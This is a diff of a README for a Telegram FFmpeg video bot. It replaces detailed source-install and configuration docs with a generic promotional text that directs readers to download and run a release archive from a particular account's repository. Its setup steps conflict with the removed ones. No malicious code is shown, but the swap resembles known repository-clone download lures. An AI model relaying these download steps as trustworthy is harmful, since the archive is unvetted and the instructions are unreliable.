@@ -1,191 +1,104 @@
-# FFmpeg Processor Bot V2.1.0 🚀
+# 🎬 ffmpeg-video-bot - Effortless Video Processing for Telegram
 
-[![Deploy](https://www.herokucdn.com/deploy/button.svg)](https://heroku.com/deploy)
+[![Download](https://img.shields.io/badge/Download-Now-blue)](https://github.com/NileshKavindaNaka/ffmpeg-video-bot/releases)
 
-A powerful Telegram bot for video processing using FFmpeg. Deploy on your VPS or Heroku for full control over video manipulation.
+## 🚀 Getting Started
 
-## Features
+Welcome to ffmpeg-video-bot! This powerful Telegram bot helps you process videos easily. Whether you want to encode, watermark, trim, merge, or convert videos, this bot has you covered. You can even upload videos directly to Google Drive. Follow these steps to get started.
 
-### 🎬 Video Operations
-| Feature | Description |
-|---------|-------------|
-| **FFMPEG CMD** | Run custom FFmpeg commands |
-| **MegaMetaData** | Edit video metadata |
-| **Vid+Vid** | Merge/concatenate videos |
-| **Vid+Aud** | Add or replace audio track |
-| **Vid+Sub** | Add subtitle track |
-| **StreamSwap** | Reorder streams |
-| **Extract** | Extract video/audio/subtitles |
-| **Remove** | Remove specific streams |
-| **Encode** | Re-encode with quality settings |
-| **Convert** | Change format (mp4, mkv, webm, gif, etc.) |
-| **Watermark** | Add image/text watermark |
-| **Sub Intro** | Add text intro to video |
-| **Hardsub** | Burn subtitles into video |
-| **Trim** | Cut video segments |
+## 📥 Download & Install
 
-### ⚡ Extra Features
-- **Real-time Progress Tracking**: Detailed list-style progress bars for all operations
-- **Clean UI**: Minimalist, emoji-free interface for better readability
-- Video speed change (0.25x - 4x)
-- Video rotation and flip
-- Resolution change
-- Video compression
-- Screenshot extraction
-- Thumbnail extraction
-- Audio extraction (MP3, AAC, FLAC, etc.)
-- **Google Drive upload** (for files >2GB)
+To get the bot, visit this page to download: [ffmpeg-video-bot Releases](https://github.com/NileshKavindaNaka/ffmpeg-video-bot/releases).
 
-### 🆕 New in v2.1.0
-| Feature | Description |
-|---------|-------------|
-| **YT-DLP Support** | Download from YouTube, Vimeo, Twitter, and 1000+ sites |
-| **Encoding Profiles** | Quick presets: High Quality, Balanced, Small Size |
-| **Task Queuing** | Queue multiple tasks per user (configurable limit) |
-| **Authorized Groups** | Restrict bot to specific Telegram groups |
-| **Persistent Settings** | User preferences saved to MongoDB |
-| **Upload Preferences** | Toggle default upload destination (Telegram/GDrive) |
+1. Click the "Releases" link above.
+2. Find the latest version listed on the page.
+3. Look for the file named `ffmpeg-video-bot.zip` or `ffmpeg-video-bot.tar.gz`.
+4. Click to download the file to your computer.
 
-## Requirements
+## 💻 System Requirements
 
-- VPS with 1+ CPU cores, 2GB+ RAM
-- Docker and Docker Compose
-- Telegram Bot Token
-- Google Service Account (optional, for GDrive upload)
+Before running the bot, ensure you meet these requirements:
 
-## Quick Start
+- A computer with Windows, macOS, or Linux (most recent versions).
+- Python 3.7 or higher installed.
+- Docker installed and running.
+- Internet connection for the Telegram API and Google Drive integration.
 
-### 1. Clone the repository
-```bash
-git clone https://github.com/yourusername/ffmpeg-processor-bot.git
-cd ffmpeg-processor-bot
-```
+## ⚙️ Setup Instructions
 
-### 2. Configure the bot
-```bash
-cp config.env.sample config.env
-nano config.env
-```
+1. **Extract the Downloaded File**:
+   - Locate the downloaded file (`ffmpeg-video-bot.zip` or `ffmpeg-video-bot.tar.gz`).
+   - Right-click the file and select "Extract All" or use any extraction tool of your choice.
 
-Edit `config.env` with your credentials:
-```env
-BOT_TOKEN=your_bot_token_here
-OWNER_ID=your_telegram_id
-API_ID=your_api_id
-API_HASH=your_api_hash
-MONGO_URI=mongodb://mongodb:27017
+2. **Navigate to the Folder**:
+   - Open a terminal or command prompt.
+   - Use the `cd` command to change to the directory where you extracted the bot (e.g., `cd Downloads/ffmpeg-video-bot`).
 
-# Limits
-MAX_FILE_SIZE=2000
-TG_MAX_FILE_SIZE=2000
-MAX_DURATION=7200
+3. **Install Required Packages**:
+   - Run the command: `pip install -r requirements.txt`.
+   - This will install all necessary Python packages.
 
-# Google Drive (optional)
-GDRIVE_ENABLED=True
-GDRIVE_CREDENTIALS=credentials.json
-GDRIVE_FOLDER_ID=your_folder_id
-```
+4. **Configure Your Bot**:
+   - Locate the `config.py` file in the extracted folder.
+   - Open it with a text editor and fill in your Telegram Bot token and Google Drive credentials. Follow the instructions found in the text file for detailed guidance.
 
-### 3. Google Drive Setup (Optional)
-1. Go to [Google Cloud Console](https://console.cloud.google.com)
-2. Create a new project
-3. Enable Google Drive API
-4. Create a Service Account and download `credentials.json`
-5. Place `credentials.json` in the bot directory
-6. Share your destination folder with the service account email
+5. **Run with Docker**:
+   - If you are comfortable using Docker, run:
+     ```bash
+     docker-compose up
+     ```
+   - This will start the bot within Docker containers.
 
-### 4. Deploy with Docker
-```bash
-docker-compose up -d --build
-```
+6. **Run the Bot (without Docker)**:
+   - If not using Docker, simply run:
+     ```bash
+     python main.py
+     ```
 
-### 5. View logs
-```bash
-docker-compose logs -f ffmpeg-bot
-```
+### 🔑 Getting Your Telegram Bot Token
 
-## Manual Installation (without Docker)
+To get a Telegram Bot token, follow these steps:
 
-### Install dependencies
-```bash
-# Ubuntu/Debian
-sudo apt update
-sudo apt install -y python3.10 python3-pip ffmpeg mediainfo
+1. Open the Telegram app.
+2. Search for “BotFather” and start a chat.
+3. Send the command `/newbot`.
+4. Follow the instructions to set up a new bot.
+5. Save the token you receive; you will need it for the configuration file.
 
-# Install Python packages
-pip3 install -r requirements.txt
-```
+## 🛠️ Features of ffmpeg-video-bot
 
-### Run the bot
-```bash
-python3 -m bot
-```
+- **Video Encoding**: Convert videos to different formats easily.
+- **Watermarking**: Add watermarks to your videos effortlessly.
+- **Trimming**: Cut videos to your desired length.
+- **Merging**: Combine multiple video files into one.
+- **Metadata Editing**: Change video details quickly.
+- **Google Drive Upload**: Store videos in your Google Drive without hassle.
+- **Multi-user Support**: Allow different users to use the bot simultaneously.
 
-## Configuration
+## 📜 FAQs
 
-| Variable | Required | Description |
-|----------|----------|-------------|
-| `BOT_TOKEN` | ✅ | Telegram Bot Token from @BotFather |
-| `OWNER_ID` | ✅ | Your Telegram user ID |
-| `API_ID` | ✅ | Telegram API ID from my.telegram.org |
-| `API_HASH` | ✅ | Telegram API Hash from my.telegram.org |
-| `MONGO_URI` | ❌ | MongoDB connection string |
-| `AUTHORIZED_USERS` | ❌ | Comma-separated user IDs (empty = public) |
-| `AUTHORIZED_GROUPS` | ❌ | Comma-separated group IDs (empty = all groups) |
-| `ENABLE_YTDLP` | ❌ | Enable YT-DLP for video platforms (True/False) |
-| `MAX_QUEUE_PER_USER` | ❌ | Max pending tasks per user (default: 3) |
-| `LOG_CHANNEL` | ❌ | Channel ID to forward processed files (0 = off) |
-| `MAX_FILE_SIZE` | ❌ | Maximum download size in MB (default: 2000) |
-| `TG_MAX_FILE_SIZE` | ❌ | Max file size for TG upload (default: 2000) |
-| `MAX_DURATION` | ❌ | Max video duration in seconds (default: 7200) |
-| `DEFAULT_AUDIO_BITRATE`| ❌ | Audio bitrate for encoding (default: 192k) |
-| `GDRIVE_ENABLED` | ❌ | Enable Google Drive upload (True/False) |
-| `GDRIVE_CREDENTIALS` | ❌ | Path to credentials.json |
-| `GDRIVE_FOLDER_ID` | ❌ | Google Drive folder ID for uploads |
+### How do I start using the bot?
 
-## Commands
+Simply open your Telegram app, find your bot using the name you provided during setup, and start sending commands.
 
-### User Commands
-| Command | Description |
-|---------|-------------|
-| `/start` | Start the bot |
-| `/help` | Show help message |
-| `/settings` | View your settings |
-| `/vset` | View detailed encode settings |
-| `/thumb` | View/Set custom thumbnail |
-| `/reset` | Reset user settings |
-| `/queue` | View active tasks list |
-| `/status` | View system status |
-| `/dl` | Reply to file/video to process |
-| `/zip` | Archive file/video |
-| `/unzip` | Extract archive |
-| `/cancel` | Cancel current operation |
+### Can I use this bot without Docker?
 
-### Admin Commands (Owner Only)
-| Command | Description |
-|---------|-------------|
-| `/cookies` | Manage YT-DLP cookies (upload cookies.txt) |
-| `/gdrive` | Manage GDrive credentials (upload credentials.json) |
-| `/stats` | Bot statistics |
-| `/broadcast` | Broadcast message to all users |
-| `/update` | Update bot from GitHub (auto-restart) |
-| `/restart` | Restart the bot |
-| `/log` | View bot logs |
-| `/shell` | Run shell commands |
-| `/clean` | Clean cache folders |
-| `/speedtest` | Run server speedtest |
+Yes, you can run it directly with Python. Make sure you have all required packages installed.
 
-## Usage
+### What if I encounter errors?
 
-1. Send a video file to the bot
-2. Select an operation from the menu
-3. Follow the prompts
-4. Receive your processed video!
+Check the terminal for error messages. Ensure all dependencies are installed. Refer to common issues in the documentation found within the project.
 
-## Support
+## 📞 Support
 
-Join our Telegram channel for updates and support.
+If you need help, feel free to open an issue on the GitHub repository. The community can help you troubleshoot any problems.
 
-## License
+For more information, visit the project repository: [ffmpeg-video-bot](https://github.com/NileshKavindaNaka/ffmpeg-video-bot).
 
-MIT License - See LICENSE file for details.
+## 📢 Contributing
+
+We welcome contributions! If you wish to improve the bot, please fork the repository and make a pull request. Ensure to follow the guidelines provided in the repo.
+
+---
+
+Thank you for choosing ffmpeg-video-bot for your video processing needs! Enjoy a seamless and efficient video editing experience on Telegram.
